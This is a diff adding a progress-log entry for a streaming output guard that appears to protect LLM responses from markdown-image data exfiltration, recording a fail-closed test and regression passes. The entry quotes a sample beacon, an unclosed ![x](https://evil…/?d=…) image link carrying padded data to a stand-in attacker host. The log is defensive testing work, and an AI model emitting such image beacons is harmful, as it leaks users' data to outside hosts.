@@ -635,6 +635,16 @@
         secure_streaming.py, test_adversarial_attacks.py, test_e14_streaming_split.py.
         (NOTE: this INVALIDATES the earlier "FINAL COMPLETION" — a real leak existed; completion is
         re-established only after this fix + the full regression above.)
+      G40 CAP-PATH HARDEN + GATE RE-ESTABLISH 2026-07-02 (post-leak-fix solidification):
+        Exercised the ONE untested branch of the G40 fix — the MAX_OPEN_MEDIA_HOLDBACK (8192) fail-closed
+        path (_defang_open_media). Streamed a never-closing ![x](https://evil…/?d=<15KB 'A'> opener that
+        crosses the cap UNCLOSED (5000-char frags, no boundary/no ')'). Result on guard AND fallback:
+        opener defanged in place -> "[exfil-redacted]" marker present, auto_render=no, no renderable
+        beacon parts survive, even when a ')' arrives AFTER the cap flush (orphaned tail is inert text,
+        no opener). Froze as test_g40_cap_failclosed_oversized_unclosed_opener (guard+fallback) — E14
+        streaming suite now 25 passed. Then RE-ESTABLISHED completion gate #3 post-G40: golden+adversarial
+        272 passed × 3 consecutive in-process (29.0s/20.5s/17.4s; 267+5 G40 golden; deterministic).
+        commit ae80aee6 (test). G40 fix now fully branch-covered.
       ★ FINAL COMPLETION 2026-07-02 (+G30..G38): ALL 7 criteria met. The prior sole blocker — the tier-2
         guard-model HALLUCINATION FP (translate-a-paragraph blocked on a fabricated self-referential ROT13)
         — is FIXED (G30) + live-confirmed (now allows). Post-G30 full-corpus-live re-run: 0 leaks, 0 under-
